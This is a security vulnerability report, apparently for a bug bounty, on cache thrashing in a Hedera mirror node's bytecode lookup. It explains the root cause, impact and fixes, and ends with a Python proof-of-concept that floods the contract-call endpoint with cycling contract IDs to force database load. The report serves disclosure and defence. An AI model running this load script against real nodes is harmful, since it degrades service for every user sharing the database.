### Title
Cache Thrashing via Predictable contractId Cycling Forces Sustained DB Polling in `findRuntimeBytecode()`

### Summary
The `findRuntimeBytecode()` method in `ContractRepository` uses a Caffeine cache with a hard cap of 1,000 entries and no per-source rate limiting. An unprivileged attacker who cycles contract call requests across more than 1,000 distinct, predictable `contractId` Long values continuously evicts legitimate entries from the cache, forcing every subsequent legitimate lookup to hit the database. Because the global rate limiter is not per-IP and allows up to 500 RPS, the attacker can sustain this pressure indefinitely, driving DB I/O well above the 30% threshold.

**Root cause — two compounding weaknesses:**

1. **Cache size is 1,000 entries.** Hedera entity IDs are sequential `Long` values starting from 1. Any caller who supplies more than 1,000 distinct `to` addresses in their contract call requests will continuously evict the oldest cache entry, keeping the cache perpetually cold for any ID outside the current working set.

2. **`unless = "#result == null"` does not protect against cache thrashing.** In Spring's caching abstraction the `#result` SpEL variable refers to the `Optional<byte[]>` object returned by the method, which is never `null` (it is either `Optional.of(bytes)` or `Optional.empty()`). Therefore the condition is always `false` and every result — including `Optional.empty()` for non-existent contracts — is stored in the cache. This means the attacker does not even need valid contract IDs; any sequential Long values fill the 1,000-slot cache and evict legitimate entries. [1](#0-0) 

**Exploit flow:**

The attacker sends POST `/api/v1/contracts/call` requests with `to` addresses that map to contractIds 1, 2, 3, …, N (N >> 1,000). `ContractBytecodeReadableKVState.readFromDataSource()` calls `contractRepository.findRuntimeBytecode(entityId.getId())` for each request. [5](#0-4) 

With N = 10,000 unique IDs and 500 RPS, the Caffeine cache (size 1,000) holds at most 10% of the working set. Approximately 450 of every 500 requests per second bypass the cache and execute `SELECT runtime_bytecode FROM contract WHERE id = :contractId` against the database. [6](#0-5) 

### Impact Explanation
Under normal operation with a warm cache the node issues a small number of DB queries per second for bytecode lookups. The attacker drives this to ~450 DB queries/second — a many-fold increase in read I/O on the `contract` table. This degrades query latency for all other users sharing the same database connection pool, increases CPU load on the DB server, and can cause cascading timeouts across the web3 service (default statement timeout is 3,000 ms). [2](#0-1) 

### Likelihood Explanation
The attack requires no credentials, no special knowledge, and no brute force. Hedera entity IDs are publicly enumerable sequential integers. The attacker needs only a standard HTTP client and a list of 10,000 sequential integers. The global rate limiter (500 RPS) is not partitioned per source IP, so a single attacker can consume the entire budget. [4](#0-3) 

The attack is repeatable indefinitely because the cache eviction is a structural property of the fixed `maximumSize=1000` setting, not a transient condition. [2](#0-1) 

### Recommendation

1. **Increase cache size.** The Hedera mainnet has hundreds of thousands of deployed contracts. Raise `maximumSize` to at least 50,000–100,000 to make cache thrashing impractical. [2](#0-1) 

2. **Add per-IP rate limiting.** The current global bucket allows a single source to consume all 500 RPS. Introduce a per-source-IP token bucket (e.g., via a servlet filter or Spring Security) so one attacker cannot monopolize the budget. [7](#0-6) 

3. **Cache negative results explicitly with a short TTL.** Change `unless` to also exclude `Optional.empty()` results, then add a separate short-lived negative cache (e.g., 30 s TTL, large size) so repeated misses for the same non-existent ID are served from memory rather than hitting the DB. [1](#0-0) 

### Proof of Concept

```python
import requests, threading, itertools, time

BASE = "http://<mirror-node>:8545/api/v1/contracts/call"
HEADERS = {"Content-Type": "application/json"}

# Generate 10,000 unique long-zero EVM addresses (contractId 1..10000)
def addr(n):
    return "0x" + hex(n)[2:].zfill(40)

def worker(ids):
    for cid in ids:
        payload = {
            "to": addr(cid),
            "data": "0x",
            "gas": 50000,
            "estimate": False,
            "block": "latest"
        }
        try:
            requests.post(BASE, json=payload, headers=HEADERS, timeout=2)
        except Exception:
            pass

# Spin up threads cycling through 10,000 unique contractIds
ids = list(range(1, 10001))
cycle = itertools.cycle(ids)

threads = []
for _ in range(50):          # 50 threads × ~10 RPS each ≈ 500 RPS
    chunk = [next(cycle) for _ in range(200)]
    t = threading.Thread(target=worker, args=(chunk,))
    threads.append(t)

start = time.time()
for t in threads: t.start()
for t in threads: t.join()
print(f"Done in {time.time()-start:.1f}s")
# Monitor DB: SELECT count(*) FROM pg_stat_activity WHERE query LIKE '%runtime_bytecode%';
# Expect ~450 active queries/second vs. near-zero baseline.
```
